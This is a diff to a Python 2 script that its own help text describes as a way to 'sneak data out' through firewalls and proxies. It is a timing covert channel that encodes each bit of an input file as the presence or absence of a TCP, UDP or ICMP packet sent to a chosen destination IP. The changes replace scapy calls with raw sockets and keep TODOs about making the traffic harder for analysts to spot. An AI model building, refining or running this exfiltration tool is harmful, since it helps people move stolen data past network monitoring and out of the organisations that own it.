@@ -16,29 +16,29 @@
 # Place, Suite 330, Boston, MA  02111-1307  USA
 #
 
-# TODO: Various items listed in function TODO lists
 # TODO: Add gzip functionality to reduce time to send overall file
 
 import argparse
 import base64
-import random
-import time
 import socket
+import time
 
 # TODO: Add verbose argument
 parser = argparse.ArgumentParser(description='Sneak data out through any ' +
     'connection that allows traffic to pass through, even if it\'s a '
     'regenerative proxy. Be aware that random latency can cause problems ' +
-    'reconstructing the data at the receiving end.')
+    'reconstructing the data at the receiving end; latency effects increase ' +
+    'as packet rate is increased.')
 parser.add_argument('-s', nargs=1, metavar='<src>',
     help='Source IP address (not currently implemented')
 parser.add_argument('-d', nargs=1, metavar='<dst>',
-    help='Destination IP address')
+    help='Destination IP address (required)')
 parser.add_argument('-p', nargs=1, metavar='port',
     help='Destination port (default is 80)')
 parser.add_argument('--proto', nargs=1, metavar='',
-    help='Protocol to use (T=TCP (default), U=UDP, I=ICMP)')
-parser.add_argument('-f', nargs=1, metavar='filename', help='Source file name')
+    help='Protocol to use (t=TCP, u=UDP (default), i=ICMP) ICMP requires ' +
+    'root access')
+parser.add_argument('-f', nargs=1, metavar='filename', help='Input file name')
 parser.add_argument('-r', nargs=1, metavar='integer',
     help='Number of packets to send per second ' +
     '(default 1; recommended is 5 or less)')
@@ -54,6 +54,9 @@ args = parser.parse_args()
 # Defaults are port 80, 1 packet/sec, use TCP
 if args.d:
     dest = args.d[0]
+else:
+    print "Destination address (-d) is required."
+    exit()
 if not args.p:
     dstport = 80
 else:
@@ -71,28 +74,28 @@ zipstatus = args.z
 if not args.proto:
     proto = 'TCP'
 else:
-    if args.proto[0] == 'T':
+    if args.proto[0] == 't':
         proto = 'TCP'
-    elif args.proto[0] == 'U':
+    elif args.proto[0] == 'u':
         proto = 'UDP'
-    elif args.proto[0] == 'I':
+    elif args.proto[0] == 'i':
         proto = 'ICMP'
     else:
-        proto = 'TCP'
+        proto = 'UDP'
 
 # Set default packet data
-# TODO: Make this look more realistic, especially for UDP
+# TODO: Make this look more realistic
 # TODO: Come up with variable packet contents based on presumed protocol
 # TODO: When this gets big enough (past about four options), put in other file
-data = '6564693564656164'.decode('hex')
+data = '436174686572696e65'.decode('hex')
 
-
+# Remove next after debugging complete
 debug_count = 0
 
 
 # binstring takes a single character and converts it to an 8-character string
 #   of zeroes and ones
-# TODO: Write Unicode version of this and sendchar
+# TODO: Write Unicode version of this
 def binstring(c):
     if (len(c) > 1) or (type(c) is not str):
         return None
@@ -103,8 +106,8 @@ def binstring(c):
 
 
 # sendchar takes a single character, uses binstring to convert it to "binary",
-# and then parses the "binary" string to determine whether to send a packet after
-# each timing gap
+# and then parses the "binary" string to determine whether to send a packet
+# after each timing gap
 def sendchar(c, delay):
     global debug_count
     str1 = binstring(c)
@@ -112,8 +115,9 @@ def sendchar(c, delay):
         return
     for l in str1:
         if l == '0':
+            # Remove next two after debugging complete
             debug_count += 1
-            print str(debug_count) + " No packet to send"  # Remove after debugging complete
+            # print str(debug_count) + " No packet to send"
             time.sleep(delay)
         else:
             debug_count += 1
@@ -132,10 +136,6 @@ def sendmessage(text, rate):
 
 
 # Check the protocol and send packets of the appropriate type
-# TODO: TCP, ICMP sections
-# TODO: TCP - check for SYN-ACK response, which would indicate a proxy in
-#       between, and send ACK to close the loop and ensure the initial SYN
-#       is sent
 # TODO: Make packets look like something real as these will stand out to an
 # experienced packeteer
 # PONDER: Better to have timer here or in sendchar?
@@ -143,8 +143,9 @@ def buildandsend(delay):
     global debug_count
     print str(debug_count) + " Sending packet"
     if (proto == 'TCP'):
-        send(IP(dst=dest, flags=2)/TCP(sport=random.randrange(1025,65535),
-            dport=dstport))
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
+        s.connect((dest, dstport))
+        s.close
         time.sleep(delay)
     if (proto == 'UDP'):
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, 0)
@@ -153,8 +154,10 @@ def buildandsend(delay):
         s.close
         time.sleep(delay)
     if (proto == 'ICMP'):
-        send(IP(dst=dest, flags=2)/ICMP(id=random.randrange(1025,65535),
-            seq=1))
+        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, 1)
+        s.connect((dest, dstport))
+        s.send(data)
+        s.close
         time.sleep(delay)
     return
 
